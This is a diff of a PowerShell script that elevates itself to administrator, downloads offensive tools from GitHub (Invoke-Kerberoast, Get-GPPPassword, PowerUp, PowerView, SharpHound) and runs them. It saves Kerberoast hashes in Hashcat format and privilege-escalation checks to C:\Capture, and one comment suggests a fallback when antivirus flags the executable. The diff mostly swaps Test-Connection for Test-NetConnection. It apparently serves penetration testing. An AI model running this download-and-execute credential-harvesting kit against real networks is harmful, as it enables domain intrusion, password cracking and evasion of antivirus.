@@ -14,7 +14,7 @@ $arguments = "& '" + $myinvocation.mycommand.definition + "'"
 Start-Process powershell -Verb runAs -ArgumentList $arguments
 Break
 }
-#Create capture file
+#Create capture file, change the path if you can't write to C:\ (Or don't want to)
 $path="C:\Capture"
 "Creating the capture folder..."
 If(!(test-path $path))
@@ -26,8 +26,8 @@ else
 {
 	Write-Host 	"Failed to create the capture folder, it already exists" -ForegroundColor Red
 }
-$modules=split-path $SCRIPT:MyInvocation.MyCommand.Path -parent
-$client=New-Object System.Net.WebClient
+$modules = split-path $SCRIPT:MyInvocation.MyCommand.Path -parent
+$client = New-Object System.Net.WebClient
 #specify modules folder
 $modulepath=$env:psmodulepath.split(';')[0].split(' ')
 Write-Host "Using Module path: $modulepath" -ForegroundColor Green
@@ -38,7 +38,7 @@ If(!(test-path $modulepath/Kerberoast))
 }
 #download Kerberoast
 Write-Host "Fetching Kerberoast module..."
-If(Test-Connection -ComputerName "https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1" -Count 1 -Quiet)
+If(Test-NetConnection -ComputerName "https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1" -WarningAction silentlyContinue)
 {
 $client.DownloadFile("https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1","$modulepath/Kerberoast/Kerberoast.psm1")
 }
@@ -53,7 +53,7 @@ Import-Module Kerberoast.psm1
 Write-Host "Running Kerberoast, if you see red, it's normal." -ForegroundColor  Yellow
 Invoke-Kerberoast -OutputFormat Hashcat | Out-File $path\Kerberoast.krb 
 
-#BloodHound Powershell Method -- Use this if .Exe is picked up by AV. 
+#BloodHound Powershell Method -- Try this if .Exe is picked up by AV. 
 <#
 If(!(test-path $modulepath/Sharp))
 {
@@ -78,7 +78,7 @@ If(!(test-path $modulepath/Sharp))
 }
 Write-Host "Fetching Sharphound.exe..."
 [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
-If(Test-Connection -ComputerName "https://github.com/BloodHoundAD/BloodHound/blob/1.5/Ingestors/SharpHound.exe?raw=true" -Count 1 -Quiet)
+If(Test-NetConnection -ComputerName "https://github.com/BloodHoundAD/BloodHound/blob/1.5/Ingestors/SharpHound.exe?raw=true" -WarningAction silentlyContinue)
 {
 $client.DownloadFile("https://github.com/BloodHoundAD/BloodHound/blob/1.5/Ingestors/SharpHound.exe?raw=true","$modulepath/Sharp/Sharp.exe")
 }
@@ -96,7 +96,7 @@ If(!(test-path $modulepath/PrivEsc))
       New-Item -ItemType Directory -Force -Path $modulepath/PrivEsc | Out-Null
 }
 Write-Host "Fetching PowerUp module..."
-If(Test-Connection -ComputerName "https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1" -Count 1 -Quiet)
+If(Test-NetConnection -ComputerName "https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1" -WarningAction silentlyContinue)
 {
 $client.DownloadFile("https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1","$modulepath/PrivEsc/PrivEsc.psm1")
 }
@@ -106,7 +106,7 @@ else
 	Copy-Item "$modules/PowerUp.ps1" -Destination "$modulepath/PrivEsc/PrivEsc.psm1"
 }
 Write-Host "Importing module..."
-Import-Module PrivEsc.ps1
+Import-Module PrivEsc.psm1
 Write-Host "Checking for Privilege Escalation paths...." -ForegroundColor Yellow
 Invoke-AllChecks | Out-File $path\PrivEsc.txt
 
@@ -117,7 +117,7 @@ If(!(test-path $modulepath/GPP))
 }
 #check for GPP passwords
 Write-Host "Fetching GPPP module..." 
-If(Test-Connection -ComputerName "https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/privesc/Get-GPPPassword.ps1" -Count 1 -Quiet)
+If(Test-NetConnection -ComputerName "https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/privesc/Get-GPPPassword.ps1" -WarningAction silentlyContinue)
 {
 $client.DownloadFile("https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/privesc/Get-GPPPassword.ps1","$modulepath/GPP/GPP.psm1")
 }
@@ -139,8 +139,7 @@ If(!(test-path $modulepath/PowerView))
       New-Item -ItemType Directory -Force -Path $modulepath/PowerView | Out-Null
 }
 Write-Host "Fetching PowerView module..." 
-
-If(Test-Connection -ComputerName "https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1" -Count 1 -Quiet)
+If(Test-NetConnection -ComputerName "https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1" -WarningAction silentlyContinue)
 {
 $client.DownloadFile("https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1","$modulepath/PowerView/PowerView.psm1")
 }
